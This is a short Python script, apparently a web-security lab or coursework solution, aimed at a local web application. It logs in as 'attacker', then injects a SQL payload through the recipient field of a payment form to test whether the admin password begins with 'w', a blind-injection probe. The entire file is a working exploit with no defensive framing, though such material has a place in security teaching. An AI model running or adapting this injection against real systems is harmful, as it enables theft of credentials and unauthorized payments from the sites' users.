from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                    })
    return response.status_code == codes.ok

def sqli_attack(username):
    strng = username + "' AND users.password LIKE 'w%' LIMIT 1 OFFSET 0--"
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))
    assert(submit_pay_form(sess, strng, 10))


def main():
    sqli_attack("admin")

if __name__ == "__main__":
    main()
